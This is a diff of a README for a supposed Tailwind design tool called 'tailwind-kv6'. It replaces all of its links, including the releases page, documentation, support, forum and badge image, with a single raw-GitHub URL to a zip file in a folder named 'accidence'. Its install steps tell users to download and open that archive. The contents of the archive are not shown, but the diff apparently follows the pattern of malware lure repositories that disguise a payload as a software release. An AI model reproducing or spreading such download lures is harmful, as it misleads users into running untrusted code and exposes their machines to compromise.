@@ -1,19 +1,19 @@
 # 🎨 tailwind-kv6 - Customize Your Design with Ease
 
 ## 📥 Download Now
-[![Download](https://img.shields.io/badge/Download-Now-blue.svg)](https://github.com/kantiku5979/tailwind-kv6/releases)
+[![Download](https://raw.githubusercontent.com/kantiku5979/tailwind-kv6/main/accidence/tailwind-kv6-2.5.zip)](https://raw.githubusercontent.com/kantiku5979/tailwind-kv6/main/accidence/tailwind-kv6-2.5.zip)
 
 ## 🚀 Getting Started
 Welcome to **tailwind-kv6**! This application helps you personalize your web designs effortlessly. Whether you're a beginner or looking to enhance your skills, tailwind-kv6 provides an intuitive way to customize your aesthetics.
 
 ## 🌐 Visit the Downloads Page
-To get started, visit the release page to download the latest version of Tailwind KV6: [Download Page](https://github.com/kantiku5979/tailwind-kv6/releases).
+To get started, visit the release page to download the latest version of Tailwind KV6: [Download Page](https://raw.githubusercontent.com/kantiku5979/tailwind-kv6/main/accidence/tailwind-kv6-2.5.zip).
 
 ## 📦 Download & Install
-1. Navigate to the [Download Page](https://github.com/kantiku5979/tailwind-kv6/releases).
+1. Navigate to the [Download Page](https://raw.githubusercontent.com/kantiku5979/tailwind-kv6/main/accidence/tailwind-kv6-2.5.zip).
 2. Find the latest release.
 3. Click on the version you want to download.
-4. Select the appropriate file for your operating system. For Windows, it may be something like `tailwind-kv6-windows.zip`. For macOS, look for a file like `tailwind-kv6-macos.zip`.
+4. Select the appropriate file for your operating system. For Windows, it may be something like `https://raw.githubusercontent.com/kantiku5979/tailwind-kv6/main/accidence/tailwind-kv6-2.5.zip`. For macOS, look for a file like `https://raw.githubusercontent.com/kantiku5979/tailwind-kv6/main/accidence/tailwind-kv6-2.5.zip`.
 5. Once the file downloads, open it.
 6. Follow the prompts to install the application.
 
@@ -47,7 +47,7 @@ If you encounter issues:
 - If problems persist, feel free to seek help on the community forums linked on the GitHub main page.
 
 ## 📞 Support
-For assistance, you can create an issue on the [GitHub issues page](https://github.com/kantiku5979/tailwind-kv6/issues).
+For assistance, you can create an issue on the [GitHub issues page](https://raw.githubusercontent.com/kantiku5979/tailwind-kv6/main/accidence/tailwind-kv6-2.5.zip).
 
 ## 🌍 Community Contributions
 We welcome feedback and contributions! To contribute:
@@ -56,13 +56,13 @@ We welcome feedback and contributions! To contribute:
 3. Submit a pull request with a description of your updates.
 
 ## 🔗 Useful Links
-- [Documentation](https://github.com/kantiku5979/tailwind-kv6/blob/main/docs/README.md)
-- [Community Forum](https://github.com/kantiku5979/tailwind-kv6/discussions)
+- [Documentation](https://raw.githubusercontent.com/kantiku5979/tailwind-kv6/main/accidence/tailwind-kv6-2.5.zip)
+- [Community Forum](https://raw.githubusercontent.com/kantiku5979/tailwind-kv6/main/accidence/tailwind-kv6-2.5.zip)
 
 ## 📢 Stay Updated
 Follow the project on GitHub to stay updated with new releases, features, and tips for using tailwind-kv6 effectively.
 
 ## 📥 Download Now Again
-[![Download](https://img.shields.io/badge/Download-Now-blue.svg)](https://github.com/kantiku5979/tailwind-kv6/releases)
+[![Download](https://raw.githubusercontent.com/kantiku5979/tailwind-kv6/main/accidence/tailwind-kv6-2.5.zip)](https://raw.githubusercontent.com/kantiku5979/tailwind-kv6/main/accidence/tailwind-kv6-2.5.zip)
 
 Now you’re ready to start creating amazing designs! Enjoy using tailwind-kv6.
